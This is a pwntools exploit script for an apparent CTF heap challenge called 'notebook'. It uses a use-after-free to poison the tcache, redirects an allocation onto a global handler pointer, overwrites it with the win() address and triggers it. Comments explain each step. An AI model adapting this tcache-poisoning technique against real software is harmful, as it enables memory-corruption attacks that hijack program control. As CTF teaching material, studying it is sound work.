#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13576)
    return process(elf.path)

p = conn()

win_addr = elf.sym.win
global_handler = elf.sym.global_handler

# allocate a note at index 0
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'0')
p.sendafter(b'data: ', b'A' * 0x60)   # chunk A

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'1')
p.sendafter(b'data: ', b'B' * 0x60)   # chunk B

# When you free these chunks, glibc realizes they are small (0x60 bytes) and throws them into a singly linked list called the Tcache bin.
# Because the Tcache behaves as a Last-In, First-Out (LIFO) stack, freeing them in this order creates a linked list 
# At this point, the first 8 bytes of Chunk B literally hold the memory address of Chunk A.
# free the note at index 0
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'index: ', b'0')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'index: ', b'1')

# edit note 1 to write the address of global_handler
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'index: ', b'1')
p.sendafter(b'data: ', p64(global_handler))


# allocate dummy data
# malloc returns the first item in the list (Chunk B) and updates the head of the Tcache bin to point to the next item: global_handler.
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'2')
p.sendafter(b'data: ', b'X')   # chunk at global_handler

# allocate the win address at global_handler
# malloc looks at the Tcache bin, sees global_handler, and mistakenly hands you a pointer to that global variable. When you write win_addr 
# into "Index 3", you are actually overwriting the data at global_handler with the address of the win() function.
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'3')
p.sendafter(b'data: ', p64(win_addr))   # chunk at global_handler

# trigger the win function
p.sendlineafter(b'> ', b'5')


p.interactive()
